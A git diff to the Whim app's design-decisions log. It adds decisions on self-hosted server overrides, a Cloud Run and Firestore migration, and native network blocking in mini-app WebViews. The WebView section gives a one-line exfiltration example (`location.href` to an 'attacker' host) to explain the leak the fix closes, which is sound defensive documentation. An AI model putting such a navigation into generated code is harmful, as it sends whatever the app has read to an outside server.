@@ -941,7 +941,7 @@ runtime.
 
 **(a) `adb reverse` works from a release APK; the dead-NAT note is about Metro's dev-server protocol
 only.** `adb reverse tcp:<port> tcp:<port>` is proven working transport for plain HTTP from a release
-build — precedent: `openspec/changes/archive/2026-08-01-fix-generate-stream-transport/progress.md:128`,
+build — precedent: `openspec/changes/archive/2026-08-01-fix-generate-stream-transport/progress.md:128` (file since pruned; see git history at `8c6cb385`),
 chain-7's attended on-device verification, a release APK (`./gradlew assembleRelease`) on
 `emulator-5554`, a real generation over `adb reverse tcp:8787` logging `POST /v1/generate 200
 155815ms` (`obs-v1/research.md` §7). "The emulator's NAT route to Metro is dead" (CLAUDE.md "Android
@@ -1263,3 +1263,157 @@ are in `docs/research/generation-speed-2026-09.md`.
 - **Model choice is re-made by measurement, not by feel.** `server/flowbench.mjs` drives the phone's
   flow against any roster and saves the apps for `evals/cli.mjs`; the judge method is in the change's
   `bench/` folder. Rerun both before changing a model.
+  (2026-10-09: the judge prompt moved to `docs/research/generation-speed-judge-prompt.md`; the raw
+  verdicts are in `faster-generation/bench.tar.zst`, `docs/EVIDENCE.md`.)
+
+### 70. Anyone can point Whim at their own server, on their own responsibility `[DECIDED — openspec: beta-1 D20; reverses legal-surface-v2 D10]`
+
+legal-surface-v2 D10 kept the server-address override out of store builds: only debug and offline
+builds showed or honoured it, behind a native `internalBuild` flag. Whim is open source, so a
+self-hosted server is a feature, not a dev tool. The owner reversed D10 on 2026-10-03. Research:
+`openspec/changes/beta-1/research-self-hosted.md`.
+
+- **Every build shows and honours the override.** The `internalBuild` flag existed only for D10, so
+  it is gone end to end: both native constants, `WHIM_INTERNAL_BUILD`, the TurboModule field and
+  every prop that carried it. Settings → Advanced is always there.
+- **An acknowledgement comes first.** "Use your own server" opens the launcher's confirm sheet: that
+  server gets everything Whim sends, whoever runs it decides what it keeps, and Whim's privacy
+  policy doesn't cover it. Confirming records a once-per-install acknowledgement
+  (`whim.server-ack:v1`). Until then a saved address stays unread, so one saved by an earlier build
+  doesn't silently take effect. "Use Whim's server" clears the address and keeps the
+  acknowledgement.
+- **Plain http only for local addresses, enforced by the app.** `http://` is accepted only for a
+  loopback or private-range IP literal (loopback, RFC 1918, link-local, IPv6 unique-local,
+  carrier-grade NAT), `localhost`, a `.local` name or a single-label host that isn't numeric;
+  anything else needs `https://` and is refused before it is saved. Android can't name an
+  arbitrary LAN IP in its network config, so every build type's config permits cleartext at its
+  base and this rule is the guard. The sandbox's CSP
+  keeps mini-app bundles off the network whatever that setting is. iOS ATS is unchanged.
+- **Policy text, not a manifest role.** Whim neither receives nor shares what goes to a user's own
+  server, so the disclosure manifest and `AI_CONSENT_VERSION` don't change and nobody re-consents.
+  The privacy policy (English and French) gains "If you point Whim at your own server".
+- **Store review gets told, not surprised.** The review notes disclose the feature and argue 4.7:
+  the default is Whim's server, and any server's output runs in the same sandbox.
+
+### 71. Production moves from the VM to Cloud Run, scaled to zero `[DECIDED — owner, 2026-10-07; supersedes the VM half of public-server D17]`
+
+The VM (an e2-standard-2, two 20 GB disks, a static IP and daily snapshots) cost about $2.50 a day
+with no users. The owner chose zero idle cost over durable state and a host-level egress firewall.
+The server image is unchanged. The runbook is `docs/deploy.md`, section "Cloud Run".
+
+- **Two services.** `whim-server` runs the existing image on Cloud Run gen2, at most one instance.
+  `whim-site` is Caddy with the rendered pages baked in. Domain mappings serve both hostnames.
+- **Chromium's sandbox works on gen2.** The boot self-test passes there with no seccomp profile or
+  `SYS_CHROOT` grant. One launch in ten crashes. Boot refuses without the sandbox, so the
+  platform retries on a new instance. `--no-sandbox` stays forbidden.
+- **No durable state.** The usage ledger, reports and waitlist live in instance memory and reset
+  with it, and so do the daily ceilings. The OpenRouter key's provider-side credit limit is the
+  only spend bound that survives a restart. Persistent storage (Firestore, or SQLite on a volume)
+  is the step to take before real users arrive.
+- **What the move gave up:** the VM's iptables egress firewall, the metadata-server block for the
+  server process, and the Docker-log-id alert filters. The in-process egress lock on the synthetic
+  run is unaffected.
+
+### 72. Cloud Run compute runs in us-east4; data stays in Montreal `[DECIDED — 2026-10-07; amends #71]`
+
+Cloud Run refuses custom-domain mappings in `northamerica-northeast1` (`501 … not allowed`). The free
+alternatives were the nearest region that supports mappings, or a global external load balancer at
+about $18 a month. The owner's constraint is no idle spend, so the load balancer was ruled out.
+
+- `whim-server` and `whim-site` run in `us-east4` (Virginia), under `WHIM_RUN_REGION` in
+  `deploy/defaults.env`. Artifact Registry, Cloud Build, Firestore and logs stay in `WHIM_GCP_REGION`.
+- The privacy policy's Google Cloud row reads "Canada (Montreal) and the United States (Virginia)" in
+  en, fr and ko. The policy already said information is handled in Canada and the United States. This
+  is a provider-table value, not a manifest change, so nobody re-consents.
+- Every image pull and every Firestore call crosses regions (about 15 ms). That cost is accepted.
+
+### 73. Server stores move to Firestore on Cloud Run `[DECIDED — openspec: durable-server-stores; amends #71's "No durable state"]`
+
+On Cloud Run (#71) the usage ledger, reports, beta waitlist and daily ceilings lived in instance
+memory and reset on every restart, so the provider's credit limit was the only spend bound that
+outlived an instance. Every server store now has a second backend, selected by
+`WHIM_STORE_BACKEND` (`sqlite`, the default, or `firestore`; database `WHIM_FIRESTORE_DATABASE`,
+default `(default)`). `deploy/cloudrun/deploy.sh` deploys with `firestore`. The runbook is
+`docs/deploy.md`, section "Firestore stores".
+
+- **One contract, two backends.** Both pass the same store conformance suite. The Firestore run
+  (`npm run stores:firestore:test`: the emulator from pinned firebase-tools 15.32.1, Java 21, a
+  `demo-` project) is a gate-full and CI step.
+- **Admission counters are per kind.** A device's counter is `admission/{day}:{kind}:{device}`;
+  the global counter is `admission/{day}:global:{kind}`, and a ceiling across several kinds sums
+  them inside the admitting transaction. This corrects design D2, which named one counter per
+  sorted kind set: that form disagrees with SQLite's `kind IN (...)` once one kind is checked under
+  two different sets. The transaction reads every summed counter, so two requests cannot both take
+  the last unit.
+- **Hot documents.** Each kind's global counter is one document, under Firestore's per-document
+  write-rate limit. `admit`, `refund` and each chunk of a device delete retry their transaction up
+  to 25 times; every other transaction keeps the SDK default of 5. Load-test before launch traffic.
+- **Indexes are checked statically.** The emulator does not enforce composite indexes in Native
+  mode (`--require_indexes` is Datastore-mode only). `server/test/firestore-index-coverage.ts`
+  records each query the conformance run sends and fails when one needs an entry
+  `deploy/firestore/indexes.json` lacks. `deploy.sh` creates the missing indexes before deploying
+  the server and never touches existing ones. A query no conformance case sends is unchecked, and
+  would first fail in production.
+- **Boot.** The server probes the database with `listCollections()`, bounded at 10 s, and logs
+  `stores opened` with `{ storeBackend, database }`.
+- **Operators work from a laptop.** `whim-admin` and `whim-waitlist` reach Firestore through the
+  owner's Application Default Credentials. No HTTP admin route: it would be new attack surface,
+  and the database's IAM already is the access control. `whim-admin import-sqlite` carries the VM's
+  last data (backed up 2026-10-07) into Firestore, before the first Firestore deploy. It never
+  overwrites a document: an existing one that differs is kept as found (a waitlist row's
+  `createdAt` becomes the earlier of the two), and a live `usage` document keeps its totals.
+- **Retention runs without traffic.** The in-process purges run only at boot and hourly inside a
+  live instance, and a scaled-to-zero service usually has none. An hourly Cloud Scheduler job runs
+  the Cloud Run Job `whim-purge` (`whim-admin purge`: the server's four purges at the same
+  cut-offs), which `deploy.sh` creates or updates on every Firestore deploy. A `--tag` deploy
+  updates only the job's environment and secret and leaves its image (an older one may lack
+  `whim-admin purge`); with no job it creates none and warns that retention is not enforced. No
+  HTTP route, for the same reason as above. A record can outlive its keep period by up to an hour
+  (up to a UTC day plus an hour for the ledger and idle usage, which are cut on whole UTC days). A
+  failing run prints one structured `{"severity":"ERROR","message":"purge failed",…}` line, since
+  Cloud Run records plain text at DEFAULT severity; the alert "Whim: purge job failed"
+  (`deploy/monitoring/policy-purge-failed.json`, which every plain Firestore deploy creates or
+  updates by fingerprint) emails on it.
+- **Deletion is weaker than SQLite's.** `secure_delete` overwrote purged pages; a deleted Firestore
+  document leaves Google's storage on Google's deletion timeline, and with PITR off old versions
+  are kept for 1 hour. The published keep periods are about our retention, which the purge job
+  above enforces.
+- **Not done:** more than one instance (`--max-instances` stays 1), TTL policies, PITR, backups.
+  Rollback is a deploy with `WHIM_STORE_BACKEND=sqlite`, back to instance-memory state; the
+  Firestore data stays, and the `whim-purge` job keeps enforcing retention on it.
+
+### 74. Mini-app WebViews refuse network loads natively; containment gains a fourth leg `[DECIDED — openspec: platform-release-readiness D17; closes the open item in docs/security/2026-09-14-webrtc-alias.md; makes #64's "no network access" true on device]`
+
+A sandboxed `allow-scripts` frame may navigate its own browsing context, and none of the three web
+legs (#35/#37) stops it: CSP has no directive for a frame navigating itself, the sandbox has no
+token against it, and `location` can't be stripped without breaking the runtime. So
+`location.href = 'http://attacker/?d=…'` (or a meta refresh, or an anchor click) sends one GET with
+whatever the app read. Mini-apps never need the network (generation, probes and reports use RN
+networking in native code), so the WebView itself refuses every network load.
+
+- **Android:** `NetworkDeniedWebViewManager` subclasses `RNCWebViewManager` and sets
+  `settings.blockNetworkLoads = true` in `createViewInstance`, before any prop loads a source;
+  `MainApplication` swaps it in for the one autolinked package and refuses to start otherwise.
+  Chromium turns the setting into cache-only loads for navigations, subresources, fetch/XHR,
+  beacons and prefetches. It does not reach WebSocket, WebTransport or WebRTC, which keep CSP and
+  neutralization.
+- **iOS:** `WhimWebViewNetworkDeny.m` swaps `-[WKWebView initWithFrame:configuration:]` in `+load`
+  and attaches a compiled `WKContentRuleList` blocking `^https?:` and `^wss?:` for every frame of
+  every `WKWebView` in the process. WebRTC stays with neutralization.
+- **Fail closed.** If the rule list isn't compiled (not yet, failed, file missing), the iOS web view
+  starts with page JavaScript off, so the launch ends on the app error surface and Retry works once
+  it compiles. On Android a WebView package change that breaks the subclass fails the build or the
+  startup check.
+- **Proof.** `src/host/NetworkDenyProbeScreen.tsx` plus `node scripts/netdeny/run.mjs canary`: before
+  the fix every navigation variant leaked on the emulator and the simulator; after it the canary
+  counts zero HTTP hits and zero TLS connections (Android API 36 / WebView 151 on 2026-09-15, iOS 27
+  simulator on 2026-09-19), and removing only the deny brings the leak back.
+  `checks/test/release/native-network-deny.suite.ts` locks the wiring in the gate. Desktop Chromium
+  and WebKit can't exercise this leg, so the device probe is its verdict. Physical-device runs and a
+  DNS capture are still open (#37, #38).
+- **Rejected:** `onShouldStartLoadWithRequest` (Android allows the load when JS doesn't answer in
+  250 ms, unproven for subframes, and every mount must remember it); a patch-package prop (new
+  dependency, codegen edit in `node_modules`, re-derived on every upgrade); a post-mount native
+  module (races the first load); `limitsNavigationsToAppBoundDomains` (an allowlist that also
+  restricts the bridge's script injection, iOS only); a dead proxy via
+  `WKWebsiteDataStore.proxyConfigurations` (iOS 17+, still opens a connection).
